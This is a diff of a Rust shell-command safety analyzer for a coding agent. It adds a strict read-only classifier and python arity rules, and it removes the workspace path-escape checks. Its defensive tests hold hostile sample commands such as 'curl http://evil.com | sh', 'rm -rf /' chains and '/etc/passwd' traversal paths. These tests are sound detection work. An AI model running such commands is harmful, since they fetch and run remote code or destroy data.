@@ -1,5 +1,3 @@
-#![allow(dead_code)]
-
 //! Command safety analysis for shell execution
 //!
 //! This module provides pre-execution analysis of shell commands to detect
@@ -211,8 +209,13 @@ pub static COMMAND_ARITY: &[(&str, u8)] = &[
     ("pip3 uninstall", 2),
     ("pip3 list", 2),
     ("pip3 show", 2),
-    ("python -m", 3),
-    ("python3 -m", 3),
+    // Keyed on the bare interpreter (not `python -m`): `classify_command`
+    // strips flags such as `-m` before matching, so a `"python -m"` key could
+    // never fire. Arity 2 captures the module/script word that follows, so
+    // `python -m http.server` classifies to `python http.server` (distinct from
+    // `python -m pip` → `python pip`) and `python manage.py` → `python manage.py`.
+    ("python", 2),
+    ("python3", 2),
     // ── make / cmake ─────────────────────────────────────────────────────────
     ("make", 1),
     // ── gh (GitHub CLI) ──────────────────────────────────────────────────────
@@ -357,6 +360,103 @@ pub fn prefix_allow_matches(pattern: &str, command: &str) -> bool {
     command_norm == pattern_norm || command_norm.starts_with(&format!("{pattern_norm} "))
 }
 
+const PARALLEL_READONLY_PREFIXES: &[&str] = &[
+    "git status",
+    "git log",
+    "git diff",
+    "git show",
+    "git ls-files",
+    "git blame",
+    "git grep",
+    "ls",
+    "pwd",
+    "cat",
+    "head",
+    "tail",
+    "wc",
+    "which",
+    "stat",
+    "file",
+    "du",
+    "df",
+    "grep",
+    "rg",
+    "fd",
+];
+
+/// Return `true` when a shell command is safe to auto-approve and run in a
+/// parallel read-only chunk.
+pub fn is_parallel_readonly_command(command: &str) -> bool {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return false;
+    }
+    if trimmed.contains("$(")
+        || trimmed
+            .chars()
+            .any(|ch| matches!(ch, '\n' | '\r' | ';' | '&' | '|' | '>' | '<' | '`'))
+    {
+        return false;
+    }
+
+    let tokens = shell_words(trimmed);
+    let Some(start) = primary_token_index(&tokens) else {
+        return false;
+    };
+    let command_tokens = tokens[start..].to_vec();
+
+    if let Some(inner_command) = readonly_shell_wrapper_inner_command(&command_tokens) {
+        return is_parallel_readonly_command(inner_command);
+    }
+
+    let command_refs = command_tokens
+        .iter()
+        .map(String::as_str)
+        .collect::<Vec<_>>();
+    if is_codewhale_readonly_invocation(&command_refs) {
+        return true;
+    }
+    let canonical = classify_command(&command_refs);
+    if canonical == "tail"
+        && command_refs.iter().skip(1).any(|token| {
+            *token == "-f"
+                || *token == "-F"
+                || *token == "--follow"
+                || token.starts_with("--follow=")
+        })
+    {
+        return false;
+    }
+
+    PARALLEL_READONLY_PREFIXES
+        .iter()
+        .any(|prefix| *prefix == canonical)
+}
+
+fn is_codewhale_readonly_invocation(tokens: &[&str]) -> bool {
+    let Some((command, args)) = tokens.split_first() else {
+        return false;
+    };
+    if !matches!(*command, "codewhale" | "codew") {
+        return false;
+    }
+    matches!(args, ["--version"] | ["-V"] | ["-v"] | ["--help"] | ["-h"])
+}
+
+fn readonly_shell_wrapper_inner_command(tokens: &[String]) -> Option<&str> {
+    let shell = tokens.first()?.as_str();
+    if !matches!(shell, "bash" | "sh" | "zsh") {
+        return None;
+    }
+    if tokens.len() != 3 {
+        return None;
+    }
+    if !matches!(tokens[1].as_str(), "-c" | "-lc") {
+        return None;
+    }
+    Some(tokens[2].as_str())
+}
+
 /// Safety classification of a command
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum SafetyLevel {
@@ -374,43 +474,38 @@ pub enum SafetyLevel {
 #[derive(Debug, Clone)]
 pub struct SafetyAnalysis {
     pub level: SafetyLevel,
-    pub command: String,
     pub reasons: Vec<String>,
     pub suggestions: Vec<String>,
 }
 
 impl SafetyAnalysis {
-    pub fn safe(command: &str) -> Self {
+    pub fn safe(_command: &str) -> Self {
         Self {
             level: SafetyLevel::Safe,
-            command: command.to_string(),
             reasons: vec!["Command is read-only".to_string()],
             suggestions: vec![],
         }
     }
 
-    pub fn workspace_safe(command: &str, reason: &str) -> Self {
+    pub fn workspace_safe(_command: &str, reason: &str) -> Self {
         Self {
             level: SafetyLevel::WorkspaceSafe,
-            command: command.to_string(),
             reasons: vec![reason.to_string()],
             suggestions: vec![],
         }
     }
 
-    pub fn requires_approval(command: &str, reasons: Vec<String>) -> Self {
+    pub fn requires_approval(_command: &str, reasons: Vec<String>) -> Self {
         Self {
             level: SafetyLevel::RequiresApproval,
-            command: command.to_string(),
             reasons,
             suggestions: vec![],
         }
     }
 
-    pub fn dangerous(command: &str, reasons: Vec<String>, suggestions: Vec<String>) -> Self {
+    pub fn dangerous(_command: &str, reasons: Vec<String>, suggestions: Vec<String>) -> Self {
         Self {
             level: SafetyLevel::Dangerous,
-            command: command.to_string(),
             reasons,
             suggestions,
         }
@@ -578,7 +673,11 @@ pub fn analyze_command(command: &str) -> SafetyAnalysis {
         return SafetyAnalysis::dangerous(
             command,
             vec!["Command contains multiple lines".to_string()],
-            vec!["Run one command at a time".to_string()],
+            vec![
+                "Run one command at a time".to_string(),
+                "Write multiline scripts to a file first, then execute the script".to_string(),
+                "Use task_shell_start or background shell for long interactive flows".to_string(),
+            ],
         );
     }
 
@@ -951,6 +1050,16 @@ fn target_contains_parent_escape(target: &str) -> bool {
 /// Check if a command is known to be safe
 fn is_safe_command(command: &str) -> bool {
     let command_lower = command.to_lowercase();
+    let tokens = shell_words(command);
+    if let Some(start) = primary_token_index(&tokens) {
+        let refs = tokens[start..]
+            .iter()
+            .map(String::as_str)
+            .collect::<Vec<_>>();
+        if is_codewhale_readonly_invocation(&refs) {
+            return true;
+        }
+    }
 
     for safe_cmd in SAFE_COMMANDS {
         if command_lower.starts_with(safe_cmd) {
@@ -1012,72 +1121,6 @@ fn is_workspace_safe_command(command: &str) -> bool {
     false
 }
 
-/// Check if a path escapes the workspace
-pub fn path_escapes_workspace(path: &str, workspace: &str) -> bool {
-    let path_lower = normalize_safety_path(path);
-    let workspace_lower = normalize_safety_path(workspace);
-
-    // Check for obvious escape patterns
-    if path_lower.starts_with("~/") || path_lower.starts_with("$home") {
-        return true;
-    }
-
-    if is_absolute_safety_path(&path_lower) {
-        let path_components = lexical_components(&path_lower);
-        let workspace_components = lexical_components(&workspace_lower);
-        return !components_start_with(&path_components, &workspace_components);
-    }
-
-    // Walk the path components. Track depth relative to the workspace root:
-    // non-`..` components increment depth, `..` components decrement it.
-    // If depth ever goes negative, the path escapes the workspace boundary.
-    // This correctly distinguishes genuine traversal like `../outside` from
-    // names that happen to contain consecutive dots like `foo..bar`.
-    let mut depth: i32 = 0;
-    for component in path_lower.split('/') {
-        match component {
-            "" | "." => {}
-            ".." => depth -= 1,
-            _ => depth += 1,
-        }
-        if depth < 0 {
-            return true;
-        }
-    }
-
-    false
-}
-
-fn normalize_safety_path(path: &str) -> String {
-    path.trim().replace('\\', "/").to_lowercase()
-}
-
-fn is_absolute_safety_path(path: &str) -> bool {
-    path.starts_with('/')
-        || path
-            .as_bytes()
-            .get(1..3)
-            .is_some_and(|bytes| bytes[0] == b':' && bytes[1] == b'/')
-}
-
-fn lexical_components(path: &str) -> Vec<&str> {
-    let mut components = Vec::new();
-    for component in path.split('/') {
-        match component {
-            "" | "." => {}
-            ".." => {
-                components.pop();
-            }
-            _ => components.push(component),
-        }
-    }
-    components
-}
-
-fn components_start_with(path: &[&str], prefix: &[&str]) -> bool {
-    path.len() >= prefix.len() && path.iter().zip(prefix.iter()).all(|(a, b)| a == b)
-}
-
 /// Parse a command and extract the primary command name
 pub fn extract_primary_command(command: &str) -> Option<&str> {
     let trimmed = command.trim();
@@ -1093,56 +1136,6 @@ pub fn extract_primary_command(command: &str) -> Option<&str> {
     }
 }
 
-/// Categorize commands into groups
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum CommandCategory {
-    FileSystem,
-    Network,
-    Process,
-    Package,
-    Git,
-    Build,
-    System,
-    Shell,
-    Other,
-}
-
-/// Get the category of a command
-pub fn categorize_command(command: &str) -> CommandCategory {
-    let primary = match extract_primary_command(command) {
-        Some(cmd) => cmd.to_lowercase(),
-        None => return CommandCategory::Other,
-    };
-
-    match primary.as_str() {
-        "ls" | "dir" | "cat" | "head" | "tail" | "less" | "more" | "cp" | "mv" | "rm" | "mkdir"
-        | "rmdir" | "touch" | "chmod" | "chown" | "ln" | "find" | "fd" | "locate" | "stat"
-        | "file" => CommandCategory::FileSystem,
-
-        "curl" | "wget" | "fetch" | "nc" | "netcat" | "ssh" | "scp" | "sftp" | "rsync" | "ftp"
-        | "ping" | "traceroute" | "nslookup" | "dig" | "host" | "nmap" => CommandCategory::Network,
-
-        "ps" | "top" | "htop" | "kill" | "killall" | "pkill" | "pgrep" | "nice" | "renice"
-        | "nohup" | "timeout" => CommandCategory::Process,
-
-        "npm" | "yarn" | "pnpm" | "pip" | "pip3" | "brew" | "apt" | "apt-get" | "yum" | "dnf"
-        | "pacman" => CommandCategory::Package,
-
-        "git" | "gh" | "hub" => CommandCategory::Git,
-
-        "make" | "cmake" | "ninja" | "meson" | "cargo" | "go" | "gcc" | "g++" | "clang"
-        | "rustc" | "javac" | "tsc" => CommandCategory::Build,
-
-        "sudo" | "su" | "systemctl" | "service" | "shutdown" | "reboot" | "mount" | "umount"
-        | "fdisk" | "parted" => CommandCategory::System,
-
-        "bash" | "sh" | "zsh" | "fish" | "csh" | "tcsh" | "dash" | "source" | "." | "exec"
-        | "eval" => CommandCategory::Shell,
-
-        _ => CommandCategory::Other,
-    }
-}
-
 // === Unit Tests ===
 
 #[cfg(test)]
@@ -1155,9 +1148,50 @@ mod tests {
         assert_eq!(analyze_command("cat file.txt").level, SafetyLevel::Safe);
         assert_eq!(analyze_command("git status").level, SafetyLevel::Safe);
         assert_eq!(
+            analyze_command("codewhale --version").level,
+            SafetyLevel::Safe
+        );
+        assert_eq!(analyze_command("codewhale --help").level, SafetyLevel::Safe);
+        assert_eq!(
             analyze_command("grep pattern file").level,
             SafetyLevel::Safe
         );
+    }
+
+    #[test]
+    fn parallel_readonly_command_classifier_is_strict() {
+        for command in [
+            "git status -s",
+            "git log --oneline -5",
+            "rg foo crates/",
+            "ls -la",
+            "cat Cargo.toml",
+            "bash -lc 'git status -s'",
+            "sh -c 'rg foo crates/'",
+        ] {
+            assert!(
+                is_parallel_readonly_command(command),
+                "{command} should be parallel read-only"
+            );
+        }
+
+        for command in [
+            "git status && rm -rf /",
+            "cat a > b",
+            "git push",
+            "cargo build",
+            "tail -f log",
+            "rg foo | head",
+            "find . -delete",
+            "sleep 5 &",
+            "bash -lc 'git status && rm -rf /'",
+            "bash -lc 'rg foo | head'",
+        ] {
+            assert!(
+                !is_parallel_readonly_command(command),
+                "{command} should not be parallel read-only"
+            );
+        }
     }
 
     #[test]
@@ -1183,6 +1217,29 @@ mod tests {
         assert_eq!(
             analyze_command("curl http://evil.com | sh").level,
             SafetyLevel::Dangerous
+        );
+    }
+
+    #[test]
+    fn test_multiline_command_explains_safe_workarounds() {
+        let analysis = analyze_command("python3 -c \"print('one')\nprint('two')\"");
+        assert_eq!(analysis.level, SafetyLevel::Dangerous);
+        assert_eq!(analysis.reasons, vec!["Command contains multiple lines"]);
+        assert!(
+            analysis
+                .suggestions
+                .iter()
+                .any(|suggestion| suggestion.contains("Write multiline scripts to a file first")),
+            "{:?}",
+            analysis.suggestions
+        );
+        assert!(
+            analysis
+                .suggestions
+                .iter()
+                .any(|suggestion| suggestion.contains("task_shell_start")),
+            "{:?}",
+            analysis.suggestions
         );
     }
 
@@ -1227,7 +1284,7 @@ mod tests {
             SafetyLevel::Dangerous
         );
         assert_ne!(
-            analyze_command("cargo run --bin deepseek -- eval").level,
+            analyze_command("cargo run --bin codewhale -- eval").level,
             SafetyLevel::Dangerous
         );
     }
@@ -1251,7 +1308,7 @@ mod tests {
         // contain the substring "eval" but are not eval invocations.
         // Guard against the naive `command.contains("eval")` regression
         // — these should stay safe / workspace-safe, never Dangerous.
-        let evaluate_safe = analyze_command("cargo run --bin deepseek -- eval").level;
+        let evaluate_safe = analyze_command("cargo run --bin codewhale -- eval").level;
         assert_ne!(
             evaluate_safe,
             SafetyLevel::Dangerous,
@@ -1322,62 +1379,6 @@ mod tests {
     }
 
     #[test]
-    fn test_path_escapes_workspace() {
-        assert!(path_escapes_workspace("/etc/passwd", "/home/user/project"));
-        assert!(path_escapes_workspace("~/secret", "/home/user/project"));
-        assert!(!path_escapes_workspace(
-            "./src/main.rs",
-            "/home/user/project"
-        ));
-    }
-
-    #[test]
-    fn test_path_escapes_workspace_doesnt_flag_double_dot_in_names() {
-        // Names like `foo..bar` should NOT be flagged as path traversal
-        assert!(!path_escapes_workspace(
-            "some..file.txt",
-            "/home/user/project"
-        ));
-        assert!(!path_escapes_workspace(
-            "./dir..name/file.txt",
-            "/home/user/project"
-        ));
-    }
-
-    #[test]
-    fn test_path_escapes_workspace_detects_genuine_traversal() {
-        assert!(path_escapes_workspace("../outside", "/home/user/project"));
-        assert!(path_escapes_workspace(
-            "..\\outside",
-            "C:\\Users\\me\\project"
-        ));
-        assert!(path_escapes_workspace(
-            "./subdir/../../etc/passwd",
-            "/home/user/project"
-        ));
-        assert!(path_escapes_workspace(
-            "/home/user/project/../secret",
-            "/home/user/project"
-        ));
-        assert!(path_escapes_workspace(
-            "C:\\Users\\me\\project\\..\\secret",
-            "C:\\Users\\me\\project"
-        ));
-    }
-
-    #[test]
-    fn test_path_escapes_workspace_allows_absolute_workspace_children() {
-        assert!(!path_escapes_workspace(
-            "/home/user/project/src/main.rs",
-            "/home/user/project"
-        ));
-        assert!(!path_escapes_workspace(
-            "C:\\Users\\me\\project\\src\\main.rs",
-            "C:\\Users\\me\\project"
-        ));
-    }
-
-    #[test]
     fn test_extract_primary_command() {
         assert_eq!(extract_primary_command("ls -la"), Some("ls"));
         assert_eq!(
@@ -1385,21 +1386,6 @@ mod tests {
             Some("cargo")
         );
         assert_eq!(extract_primary_command("  git status  "), Some("git"));
-    }
-
-    #[test]
-    fn test_categorize_command() {
-        assert_eq!(categorize_command("ls -la"), CommandCategory::FileSystem);
-        assert_eq!(
-            categorize_command("curl https://example.com"),
-            CommandCategory::Network
-        );
-        assert_eq!(categorize_command("git status"), CommandCategory::Git);
-        assert_eq!(categorize_command("npm install"), CommandCategory::Package);
-        assert_eq!(
-            categorize_command("sudo apt update"),
-            CommandCategory::System
-        );
     }
 
     // ── classify_command tests ────────────────────────────────────────────────
@@ -1527,6 +1513,31 @@ mod tests {
     #[test]
     fn classify_npm_test() {
         assert_eq!(classify("npm test"), "npm test");
+    }
+
+    // ── python (interpreter, arity 2) ─────────────────────────────────────────
+
+    #[test]
+    fn classify_python_module_captures_module_word() {
+        // `-m` is a flag and is stripped before arity lookup, so the canonical
+        // prefix must still capture the module that follows. Regression guard:
+        // a `"python -m"` arity key can never match (the flag is gone), which
+        // collapsed `python -m http.server` to just `python`.
+        assert_eq!(classify("python -m http.server"), "python http.server");
+        assert_eq!(
+            classify("python -m http.server --bind 0.0.0.0"),
+            "python http.server"
+        );
+        assert_eq!(classify("python3 -m venv env"), "python3 venv");
+        // Different modules classify distinctly so an allow rule for one does
+        // not leak to another.
+        assert_eq!(classify("python -m pip install x"), "python pip");
+    }
+
+    #[test]
+    fn classify_python_script_arity_2() {
+        assert_eq!(classify("python manage.py runserver"), "python manage.py");
+        assert_eq!(classify("python3 setup.py install"), "python3 setup.py");
     }
 
     // ── docker ───────────────────────────────────────────────────────────────
